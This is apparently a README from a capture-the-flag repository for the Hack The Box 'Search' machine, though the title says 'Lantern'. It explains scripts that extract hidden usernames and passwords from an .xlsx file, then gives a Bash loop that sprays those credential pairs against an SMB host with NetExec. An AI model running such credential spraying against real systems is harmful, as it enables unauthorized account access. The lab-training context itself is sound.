# HTB Lantern

Scripts for [HTB Search](https://www.hackthebox.com/machines/search) machine.

---

## Usage

### show_all_columns.py
Script to read `.xlsx` files with hidden columns (_which is not the same as encrypted_) in Python. First, create a virtual environment and install `openpyxl` library there:
```shell-session
❯ python3 -m venv .venv_openpyxl

❯ source .venv_openpyxl/bin/activate

❯ pip3 install openpyxl
```
Once the environment is activated, run the script:

```shell-session
❯ python3 show_all_columns.py
```
You might need to change the path where `.xlsx` is located in the script.


### print_username_password.py
Saves users and hidden passwords from `.xlsx` file.
```shell-session
python3 print_username_password.py
```

Then, use a tool like [NetExec](https://www.netexec.wiki/) to check which pair of credentials are correct in a simultaneous `Bash` loop:
```shell-session
❯ paste phishing_users.txt phishing_passwords.txt | while read -r u p; do nxc smb research.search.htb -u $u -p $p | grep '\[+\]'; done
```
